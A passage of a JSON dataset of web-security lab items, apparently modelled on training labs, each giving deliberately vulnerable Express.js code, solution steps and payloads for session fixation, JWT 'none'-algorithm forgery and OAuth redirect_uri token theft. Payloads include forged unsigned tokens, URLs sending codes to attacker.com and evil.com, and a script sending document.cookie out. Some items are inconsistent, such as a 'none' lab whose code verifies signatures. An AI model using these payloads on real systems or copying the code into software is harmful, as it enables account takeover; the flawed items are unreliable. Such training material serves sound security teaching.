    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Welcome to your account, Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "sid=fix123; login as carlos",
      "GET /my-account with Cookie: sid=fix123",
      "Phish Carlos with URL using sid=fix123"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to missing signature validation",
    "Lab Description": "This lab is vulnerable to JWT tampering. The backend decodes JWTs without validating their signatures. JWTs are used for user authentication and passed via Authorization headers. To solve: forge a valid JWT identifying as Carlos and access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture JWT from your login session using Burp Suite",
      "Decode the JWT using jwt.io and inspect the payload",
      "Modify payload to {\"user\":\"carlos\"} and change alg to none",
      "Remove the signature part and replay token in Authorization header",
      "Send GET /profile and verify access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.send({ token }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.user === 'carlos') return res.send('Carlos profile data'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [forged_token]",
      "{\"alg\":\"none\",\"user\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration: open redirect token theft",
    "Lab Description": "The lab contains an OAuth implementation with an open redirect in the redirect_uri parameter. The application does not validate redirect URIs strictly, enabling attackers to steal OAuth authorization codes. To solve: craft a malicious redirect_uri, capture Carlos's OAuth code, and exchange it for a token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send OAuth request with redirect_uri pointing to attacker-controlled server",
      "Trick Carlos into visiting the crafted OAuth URL",
      "Capture authorization code from your server logs",
      "Exchange code for access token via legitimate OAuth token endpoint",
      "Use the token to access /api/account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; res.redirect(`${redirectUri}?code=authcode123`); }); app.get('/token', async (req, res) => { const { code } = req.query; if (code === 'authcode123') res.send({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "https://victim.com/auth?redirect_uri=https://attacker.com/collect",
      "Captured code=authcode123",
      "GET /token?code=authcode123",
      "Authorization: Bearer token-carlos"
    ]
  }
  ,
  {
    "Lab scenario": "GraphQL endpoint exposing JWT manipulation vulnerability",
    "Lab Description": "A GraphQL API implements authentication using a stateless JWT stored in the Authorization header. The server does not validate the token signature, allowing attackers to craft arbitrary JWTs to impersonate users. The application accepts unsigned tokens with alg=none and exposes a GraphQL endpoint. To solve: Forge a JWT as carlos and retrieve his user profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to query the /graphql endpoint with a valid JWT to understand token structure",
      "Validate the server ignores signature by crafting a token with alg=none using jwt.io",
      "Edit JWT payload with { \"username\": \"carlos\" } and remove the signature segment",
      "Resend the modified token in Authorization: Bearer header to the GraphQL endpoint",
      "Query { userProfile { email username } } and confirm the username returned is carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { userProfile: User } type User { username: String, email: String }`); const users = { 'carlos': { username: 'carlos', email: 'carlos@example.com' } }; app.use('/graphql', (req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid Token'); } } next(); }, graphqlHTTP(req => ({ schema: schema, rootValue: { userProfile: () => users[req.user?.username] }, graphiql: false }))); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session ID in login workflow",
    "Lab Description": "This application assigns session IDs before login using a predictable UUIDv4 generator. After login, the same session ID remains active. The attacker can set their session ID and then trick the victim into using it. When the victim logs in, the attacker gains access to their session. To solve: Hijack Carlos's session and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a GET /login request and notice the Set-Cookie: session= field uses predictable UUIDs",
      "Send a request with a custom session ID like session=123e4567-e89b-12d3-a456-426614174000 before login",
      "Send this crafted link with the same session ID to carlos (simulate using Burp Collaborator or inject via referrer)",
      "Wait for Carlos to log in through the crafted link which ties his account to attacker session",
      "Reuse the same session ID to access /my-account as carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.session || uuid.v4(); res.cookie('session', sid); res.send('<form method=\"POST\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=123e4567-e89b-12d3-a456-426614174000",
      "Cookie: session=deadbeef-dead-beef-dead-beefdeadbeef"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration in third-party login integration",
    "Lab Description": "The application integrates with a third-party OAuth provider but does not validate the returned access token properly. Attackers can reuse tokens issued to different clients. The misconfiguration stems from missing audience (aud) validation. To solve: Use a token issued for another app to log in as carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to initiate OAuth login for your own account and capture the access token returned",
      "Notice the JWT contains claims for sub, aud, and email, but the app only checks sub for identity",
      "Obtain a token from the same OAuth provider issued to a different client_id but for sub=carlos",
      "Replace your token with the forged one in the Authorization header and send a request to /auth/callback",
      "Verify access by accessing the protected /my-account endpoint and observing Carlos’s profile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/auth/callback', (req, res) => { const token = req.query.token; try { const decoded = jwt.decode(token); req.user = decoded.sub; } catch (err) { return res.status(400).send('Invalid token'); } res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.user && users[req.user]) { res.send(`User: ${req.user}, Email: ${users[req.user].email}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJmYWtlLW90aGVyLWFwcCJ9.signature",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJtb2NrLWFwcCJ9."
    ]
  }
,
{
    "Lab scenario": "JWT tampering via algorithm confusion in authorization header",
    "Lab Description": "This lab's authorization system uses JWT tokens for user identity and access control. The server validates tokens based on the algorithm specified in the token header without enforcing expected signing algorithms. The application naively accepts tokens signed with the 'none' algorithm. To solve: Craft a JWT token that impersonates the 'admin' user and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request using Burp Suite and extract the JWT from the Authorization header.",
      "2. Decode the token at jwt.io or using a script to examine the header and payload. Confirm that the server allows algorithm substitution.",
      "3. Modify the JWT header to set \"alg\": \"none\" and set the payload to {\"username\":\"admin\"}.",
      "4. Remove the signature portion entirely and resend the modified token in the Authorization header using Postman or Burp Repeater.",
      "5. Send a GET request to /admin with the forged JWT and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = [{ username: 'admin' }, { username: 'wiener' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'supersecret', { algorithms: [payload.header.alg] }); if (verified.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{ \"username\":\"admin\" }.",
      "Authorization: Bearer <unsigned-admin-token>"
    ]
  }
,
{
    "Lab scenario": "Session fixation through predictable session token reuse",
    "Lab Description": "The lab's login mechanism assigns session tokens before authentication, but does not regenerate them afterward. The application uses cookies to maintain session state. An attacker can set a session ID before victim login, and it will be reused after successful authentication. To solve: Fixate Carlos's session ID and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie header issuing the session ID.",
      "2. Share this crafted session ID with the victim (Carlos) using social engineering or embedding it in a phishing page.",
      "3. After Carlos logs in, reuse the same session ID to impersonate him by replaying it in a request to /my-account.",
      "4. Use the session cookie in Burp Repeater to make an authenticated request to /my-account.",
      "5. Confirm that the session token grants access to Carlos's profile, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || uuid.v4(); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') { res.send('Sensitive info of Carlos'); } else { res.send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "GET /login with preset cookie: sid=attacker123",
      "POST /login with credentials for Carlos using sid=attacker123",
      "GET /my-account with same sid=attacker123"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration with token leakage via redirect_uri manipulation",
    "Lab Description": "This lab's third-party OAuth implementation fails to properly validate redirect_uri parameters. The attacker can inject a malicious endpoint to steal access tokens via a crafted URL. The application uses OAuth for logging in users. To solve: Leak Carlos's token and use it to access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to observe the OAuth login flow. Identify the authorization endpoint and check how redirect_uri is handled.",
      "2. Inject your controlled endpoint (e.g., attacker.com/callback) into the redirect_uri parameter to intercept the token.",
      "3. Send the crafted authorization URL to Carlos (phishing/social engineering). Wait for him to click and authorize.",
      "4. Capture the token in your server logs (access_token in query string or fragment).",
      "5. Replay an authenticated request with the stolen token to /api/profile and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'token') { const token = tokens['carlos']; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); } else { res.status(400).send('Invalid request'); } }); app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') { res.send('Carlos profile data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(8080);",
    "payloads": [
      "https://target.com/oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.com/callback&response_type=token",
      "GET /api/profile with header Authorization: Bearer abc123token",
      "#access_token=abc123token intercepted from attacker.com logs"
    ]
  }
,
{
    "Lab scenario": "JWT tampering via none algorithm in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management, but fails to validate the signature algorithm securely. It accepts tokens with the 'alg' set to 'none' without verifying the signature. The application blindly trusts the decoded payload. To solve: Craft a tampered JWT token impersonating the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request to /my-account while logged in with your own user.",
      "2. Extract the JWT token from the Authorization header and decode it using jwt.io or Burp Decoder.",
      "3. Modify the payload to { \"username\": \"carlos\" } and set the header to { \"alg\": \"none\" }, then remove the signature.",
      "4. Replace the Authorization header value with your modified unsigned token.",
      "5. Forward the modified request to /my-account and verify if Carlos's account data is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Access Denied'); res.send(`Account details for ${user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "The application implements session tokens that are not regenerated upon login and are derived from predictable values such as timestamps or usernames. The attacker can fix a session identifier before login. To solve: Create a session for Carlos before he logs in, then access his account once he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate a GET /login request without credentials and note the Set-Cookie header containing a session ID.",
      "2. Send the session cookie value to Carlos via phishing or assume he's logged in using the same predictable session ID.",
      "3. Once Carlos logs in using the fixed session, reuse the same session cookie in your browser.",
      "4. Send a GET /my-account request with that session cookie.",
      "5. Observe if access is granted to Carlos's authenticated session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'sess-' + new Date().getTime(); res.cookie('session', sessionId); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; if (users[username] === password) { sessions[sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}, this is your account page.`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=sess-1713100000000",
      "Cookie: session=sess-guest-session"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration in redirect URI trust",
    "Lab Description": "This lab simulates a misconfigured OAuth flow where the application does not properly validate the redirect URI, allowing open redirection and token leakage. Attackers can supply their own redirect URI to capture access tokens issued to another user. To solve: Exploit the OAuth flow to steal an access token for user 'carlos' and use it to access their protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth authorization request to /auth?redirect_uri=...",
      "2. Modify the redirect_uri parameter to point to your Burp Collaborator or webhook.site endpoint.",
      "3. Trick Carlos into clicking the manipulated OAuth login URL via social engineering.",
      "4. Capture the token in your endpoint logs and extract the access_token parameter.",
      "5. Send a GET request to /my-account with Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (!redirect_uri || !client_id || response_type !== 'token') return res.status(400).send('Invalid OAuth request'); const accessToken = 'token-carlos-abc123'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-abc123') res.send('Welcome carlos. This is your protected data.'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.site/capture&response_type=token",
      "Authorization: Bearer token-carlos-abc123"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
    "Lab Description": "This lab implements JWT-based authentication using the `alg` field in the token header to determine the algorithm dynamically. The application fails to properly validate this value, allowing an attacker to forge a valid token using `alg: none`. To solve: Forge a token that grants access to Carlos’s account using algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept a login request and retrieve your JWT token from the Set-Cookie header.",
      "Decode the token using jwt.io and observe the algorithm in the header (e.g., HS256) and payload structure.",
      "Replace the algorithm field in the token header with `none`, and remove the signature section.",
      "Modify the payload to impersonate user `carlos`.",
      "Resend the forged JWT in the Authorization header or as a cookie and access the /my-account endpoint to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: 'admin', wiener: 'user' }; app.get('/login', (req, res) => { const { username } = req.query; if (users[username]) { const token = jwt.sign({ user: username, role: users[username] }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); } else { res.status(403).send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0"
    ]
  }
,
{
    "Lab scenario": "OAuth redirect manipulation for token leakage",
    "Lab Description": "This lab integrates third-party OAuth for login and uses the `redirect_uri` parameter to navigate users post-authentication. The application fails to validate this URI properly. To solve: Manipulate the redirect_uri to leak Carlos's OAuth token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the login flow and identify the OAuth authorization request with `redirect_uri` parameter.",
      "Modify the `redirect_uri` to point to your controlled domain (e.g., https://evil.com/callback).",
      "Complete the login process using Carlos's OAuth credentials or initiate it on their behalf if tokens are URL-bound.",
      "Capture the authorization code or access token on your domain.",
      "Use the stolen token in a request to the app's /my-account endpoint to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const code = req.query.code; const redirect_uri = req.query.redirect_uri; request.post('https://oauth.example.com/token', { form: { code, client_id: 'client123', client_secret: 'secret', redirect_uri } }, (err, response, body) => { const token = JSON.parse(body).access_token; res.cookie('access_token', token); res.redirect(redirect_uri); }); }); app.get('/my-account', (req, res) => { const token = req.cookies.access_token; if (token === 'admin-oauth-token') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://evil.com/callback",
      "https://evil.com?code={authCode}",
      "https://evil.com/callback?token={accessToken}"
    ]
  }
,
{
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application assigns session tokens before authentication and does not generate a new session upon successful login. This allows an attacker to fix a session ID for a victim. To solve: Set a session ID, trick Carlos into logging in, then reuse the same session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate a session by accessing the login page and capture the session cookie (e.g., session=abc123).",
      "Send the session ID to the victim (Carlos) via phishing or an embedded link containing the fixed session cookie.",
      "Wait for Carlos to log in while using the session ID you set.",
      "Once logged in, reuse the same session cookie to access the /my-account page as Carlos.",
      "Verify access to Carlos's account and confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: true, saveUninitialized: true })); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(5000);",
    "payloads": [
      "session=fixatedSession123",
      "Set-Cookie: session=fixatedSession123",
      "GET /my-account HTTP/1.1\nCookie: session=fixatedSession123"
    ]
  }
,
{
    "Lab scenario": "JWT signature bypass in stateless session handling",
    "Lab Description": "This lab demonstrates a JWT validation flaw caused by the server not verifying the token's algorithm. The application accepts JWTs as bearer tokens to manage authentication. However, it does not verify whether the signature algorithm is secure. To solve: Modify and forge a JWT token that grants access to Carlos’s protected account page without knowing the original secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to capture a legitimate JWT from your account login.",
      "2. Decode the JWT using jwt.io or any JWT decoder and note the header and payload structure.",
      "3. Modify the 'alg' field in the JWT header from 'HS256' to 'none'. Remove the signature.",
      "4. In the payload, change 'username' to 'carlos' and re-encode the token without a signature.",
      "5. Use the tampered JWT as a Bearer token in the Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: { role: 'admin' }, wiener: { role: 'user' } }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration via open redirect abuse",
    "Lab Description": "The application integrates with a third-party OAuth provider for authentication. Due to poor redirect URI validation, it is vulnerable to open redirect abuse, allowing attackers to intercept authorization codes. To solve: Exploit the misconfigured redirect URI to capture Carlos's OAuth token and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to initiate OAuth login flow and intercept the GET request to /auth/redirect?next=[URL].",
      "2. Modify the next parameter to redirect to your malicious server (e.g., http://evil.com/callback).",
      "3. Host a listener on your server to capture the authorization code sent from the provider.",
      "4. Use the captured code with curl or Postman to manually redeem the token.",
      "5. Use the token in the Authorization header to impersonate Carlos and access /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/redirect', (req, res) => { const next = req.query.next || '/home'; res.redirect(`https://oauth-provider.com/auth?client_id=123&redirect_uri=${next}`); }); app.get('/callback', (req, res) => { const { code } = req.query; res.send('OAuth code received: ' + code); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/auth/redirect?next=http://evil.com/callback",
      "https://target.com/auth/redirect?next=https://evil.com/oauth/code",
      "https://target.com/auth/redirect?next=data:text/html,<script>location='http://evil.com?c='+document.cookie</script>"
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "This lab uses predictable session tokens vulnerable to fixation. The server does not regenerate session identifiers upon authentication, allowing an attacker to set a known token and trick a victim into using it. To solve: Set a session token, trick Carlos into logging in with it, then reuse the token to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or browser dev tools to inspect the cookie during unauthenticated browsing. Note the token format.",
      "2. Generate a custom session token manually using the same predictable pattern (e.g., static prefix + timestamp).",
      "3. Set this token in your browser cookies or with Postman and send Carlos a phishing link using this session.",
      "4. After Carlos logs in via the phishing link, reuse the same session ID in a new request to /dashboard.",
      "5. Confirm access to Carlos’s session by verifying his username or settings page content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'carlospass', wiener: 'wienerpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sessionId = req.cookies.session || `sess_${Date.now()}`; sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Dashboard for ${user}`); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "sess_1710000000000",
      "sess_1701234567890",
      "sess_1699999999999"
    ]
  }
,
{
    "Lab scenario": "JWT signature spoof using 'none' algorithm",
    "Lab Description": "This lab is vulnerable to JWT tampering due to improper validation of the token algorithm field. The application accepts tokens signed using the 'none' algorithm without verifying their authenticity. To solve: forge a token that grants administrative access to Carlos’s account without knowing the signing secret.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after a valid login and decode it using jwt.io.",
      "Observe the 'alg' field in the header; confirm it's set to 'HS256'. Replace this with 'none'.",
      "Remove the signature segment of the token, keeping only the base64-encoded header and payload.",
      "Modify the payload to change the username field to 'carlos' and set admin=true.",
      "Send the modified token in the Authorization header using Postman and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos' && payload.admin) { return res.send('Welcome Carlos - Admin Access'); } res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
      "Authorization: Bearer [token]",
      "{ \"alg\": \"none\" } header + { \"username\": \"carlos\", \"admin\": true } payload"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect misconfiguration",
    "Lab Description": "The application uses a third-party OAuth provider for login, but does not properly validate redirect URIs. An attacker can exploit this to capture tokens or impersonate a user. To solve: manipulate the redirect_uri parameter to steal Carlos’s token and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login flow and capture the GET request to /oauth/authorize.",
      "Modify the redirect_uri parameter to an attacker-controlled domain that logs the access token.",
      "Send the modified URL to Carlos (social engineering assumed).",
      "Use captured token from the attacker domain and attach it in an Authorization: Bearer header.",
      "Access /my-account as Carlos and verify token grants access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', qs.stringify({ code, redirect_uri }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }); const accessToken = tokenRes.data.access_token; res.redirect(`${redirect_uri}?token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token-123') { return res.send('Welcome Carlos!'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/callback?code=abc&redirect_uri=https://attacker.com/capture",
